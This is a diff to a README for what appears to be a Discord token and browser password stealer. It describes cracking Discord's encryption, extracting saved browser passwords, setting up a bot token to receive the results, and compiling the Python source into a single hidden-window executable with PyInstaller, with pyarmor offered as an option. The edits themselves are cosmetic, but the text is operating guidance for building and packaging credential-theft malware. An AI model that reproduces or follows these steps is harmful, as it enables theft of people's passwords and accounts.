@@ -12,6 +12,8 @@ However, this tool is designed to crack Discord's updated encryption.
 
 This tool is capable of extracting passwords from contemporary web browsers.
 
+# Preview
+
 ![alt text](https://media.discordapp.net/attachments/1034059578708594690/1051309462473953310/image.png)
 
 # Features
@@ -55,7 +57,7 @@ copy the link ad the bottom and paste it in your webbrowser to invite the bot to
 ## Configuration
 
 Open config.json and fill in your discord token and guild id,
-DM me on ``Jeff_#2475`` for help. Example shown below.
+DM me on ``!Jeff$#1337`` for help. Example shown below.
 
 ```json
 {
@@ -69,13 +71,9 @@ DM me on ``Jeff_#2475`` for help. Example shown below.
 To compile this tool to an executable please install an Python compiler like nuitka, pyinstaller or pyarmor pack.
 Here is an example of compiling with Pyinstaller
 
-## Installing Pyinstaller
-
 ```bash
 pip install pyinstaller
 ```
-
-## Compiling Source
 
 ```bash
 pyinstaller --onefile --windowed --clean --add-data="config.json;." main.py 
